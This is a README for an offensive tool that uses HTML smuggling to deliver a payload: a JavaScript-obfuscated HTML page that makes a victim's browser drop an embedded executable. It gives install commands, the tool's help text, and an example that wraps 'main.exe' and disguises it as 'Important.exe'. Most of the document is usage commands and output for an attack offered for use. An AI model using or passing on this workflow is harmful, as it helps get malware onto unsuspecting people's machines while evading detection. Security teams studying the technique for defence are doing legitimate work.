```
███████╗███╗   ███╗██╗   ██╗ ██████╗  ██████╗ ██╗     ███████╗██████╗
██╔════╝████╗ ████║██║   ██║██╔════╝ ██╔════╝ ██║     ██╔════╝██╔══██╗
███████╗██╔████╔██║██║   ██║██║  ███╗██║  ███╗██║     █████╗  ██████╔╝
╚════██║██║╚██╔╝██║██║   ██║██║   ██║██║   ██║██║     ██╔══╝  ██╔══██╗
███████║██║ ╚═╝ ██║╚██████╔╝╚██████╔╝╚██████╔╝███████╗███████╗██║  ██║
╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝
```

### HTML Smuggling

HTML smuggling is a technique used to deliver malicious payloads (such as executables or scripts) through web browsers by leveraging HTML and JavaScript. The process typically involves encoding a payload into a format suitable for embedding within HTML documents, often using methods like Base64 encoding. When the victim opens the crafted HTML file, the browser executes the embedded script, which can trigger the download of the malicious payload without requiring any user interaction.

![](https://outflank.nl/wp-content/uploads/2018/08/html_smuggling_explained.png)

### Usage

```
❯ git clone https://github.com/orbixio/http_smuggling
❯ cd http_smuggling
❯ pip install -r requirements.txt
❯ npm install -g javascript-obfuscator
❯ python main.py -h

███████╗███╗   ███╗██╗   ██╗ ██████╗  ██████╗ ██╗     ███████╗██████╗
██╔════╝████╗ ████║██║   ██║██╔════╝ ██╔════╝ ██║     ██╔════╝██╔══██╗
███████╗██╔████╔██║██║   ██║██║  ███╗██║  ███╗██║     █████╗  ██████╔╝
╚════██║██║╚██╔╝██║██║   ██║██║   ██║██║   ██║██║     ██╔══╝  ██╔══██╗
███████║██║ ╚═╝ ██║╚██████╔╝╚██████╔╝╚██████╔╝███████╗███████╗██║  ██║
╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

usage: main.py [-h] [-o OUTPUT] -i INPUT [-f FILENAME]

HTTP Smuggling

options:
  -h, --help            show this help message and exit
  -o OUTPUT, --output OUTPUT
                        Output file (default=cwd + 'payload.html')
  -i INPUT, --input INPUT
                        Input file to embed in payload
  -f FILENAME, --filename FILENAME
                        Filename that will appear in browser and download folder of victim
```
**Example**
```
❯ python main.py -i payload\main.exe -o payload.html -f Important.exe

███████╗███╗   ███╗██╗   ██╗ ██████╗  ██████╗ ██╗     ███████╗██████╗
██╔════╝████╗ ████║██║   ██║██╔════╝ ██╔════╝ ██║     ██╔════╝██╔══██╗
███████╗██╔████╔██║██║   ██║██║  ███╗██║  ███╗██║     █████╗  ██████╔╝
╚════██║██║╚██╔╝██║██║   ██║██║   ██║██║   ██║██║     ██╔══╝  ██╔══██╗
███████║██║ ╚═╝ ██║╚██████╔╝╚██████╔╝╚██████╔╝███████╗███████╗██║  ██║
╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

[+] HTML file 'payload.html' generated successfully.
```

### Resources
- https://www.outflank.nl/blog/2018/08/14/html-smuggling-explained/
- https://github.com/Arno0x/EmbedInHTML
- https://obfuscator.io